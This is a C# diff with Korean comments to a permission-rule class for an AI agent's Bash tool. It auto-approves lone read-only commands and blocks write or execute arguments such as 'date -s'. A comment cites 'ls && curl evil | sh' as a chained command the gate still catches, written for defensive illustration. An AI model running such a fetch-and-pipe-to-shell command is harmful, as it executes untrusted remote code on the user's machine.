@@ -43,7 +43,23 @@ public sealed class PermissionRules : IPermissionRuleStore
         // 못하기 때문이다. 그래서 세그먼트를 하나씩 보고 '전부' 허용될 때만 허용한다.
         // 하나라도 안 걸리면 확인으로 넘어가므로 `ls && curl evil | sh` 같은 건 여전히 잡힌다.
         // 명령치환·리다이렉션이 섞이면 세그먼트가 실제 실행을 대표하지 못하므로 적용하지 않는다.
-        return AllSegmentsAllowed(tool, call) ? RuleMatch.Allow : RuleMatch.None;
+        return AllSegmentsAllowed(tool, call) || IsSingleReadOnly(tool, call) ? RuleMatch.Allow : RuleMatch.None;
+    }
+
+    // 연산자 없는 조회 명령 하나(`ls -la`, `cat x`)도 묻지 않는다 — 예전엔 `ls | head` 는 통과하고 `ls` 하나는 매번 물어서,
+    // 사용자가 넓은 allow 규칙을 만들게 했다(2026-11-03 검토). 쓰기·실행 인자(tree -o, rg --pre, date -s)는 제외.
+    private static bool IsSingleReadOnly(ITool tool, ToolUseBlock call)
+    {
+        if (!string.Equals(tool.Name, "Bash", StringComparison.Ordinal))
+        {
+            return false;
+        }
+
+        var command = ReadCommand(call);
+        return !string.IsNullOrWhiteSpace(command)
+            && !PermissionRule.HasShellOperators(command)
+            && ReadOnlyBashCommands.Contains(FirstToken(command) ?? string.Empty)
+            && !WritesOrExecutes(command.Trim());
     }
 
     // 모든 세그먼트가 (allow 규칙 또는 내장 읽기 전용 명령 목록)으로 덮이는가.
@@ -86,16 +102,24 @@ public sealed class PermissionRules : IPermissionRuleStore
         || _allow.Any(p => PermissionRule.MatchesSegment(p, toolName, segment));
 
     // 읽기 전용 목록의 명령이라도 인자에 따라 파일을 쓰거나 다른 프로그램을 실행한다 — 그 경우는 자동 승인하지 않는다.
-    // uniq IN OUT(출력 파일), tree -o FILE, rg --pre CMD(파일마다 실행), file -C(magic 컴파일 결과 기록).
-    private static bool WritesOrExecutes(string segment)
+    // uniq IN OUT(출력 파일), tree -o FILE, rg --pre CMD(파일마다 실행), file -C(magic 컴파일 결과 기록), date -s(시계 변경).
+    // 권한 게이트의 '조회 명령' 판정(분류기 생략)도 같은 기준을 쓴다.
+    public static bool WritesOrExecutes(string segment)
     {
         var tokens = segment.Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries);
+        if (tokens.Length == 0)
+        {
+            return false;
+        }
+
         return tokens[0] switch
         {
             "uniq" => tokens.Skip(1).Count(t => t == "-" || !t.StartsWith('-')) >= 2,
             "tree" => tokens.Skip(1).Any(t => t == "-o" || t.StartsWith("--output", StringComparison.Ordinal)),
             "rg" => tokens.Skip(1).Any(t => t == "--pre" || t.StartsWith("--pre=", StringComparison.Ordinal)),
             "file" => tokens.Skip(1).Any(t => t == "--compile" || (t.StartsWith('-') && !t.StartsWith("--", StringComparison.Ordinal) && t.Contains('C'))),
+            "date" => tokens.Skip(1).Any(t => t is "-s" or "--set" || t.StartsWith("--set=", StringComparison.Ordinal)
+                                              || (t.StartsWith('-') && !t.StartsWith("--", StringComparison.Ordinal) && t.Contains('s'))),
             _ => false,
         };
     }
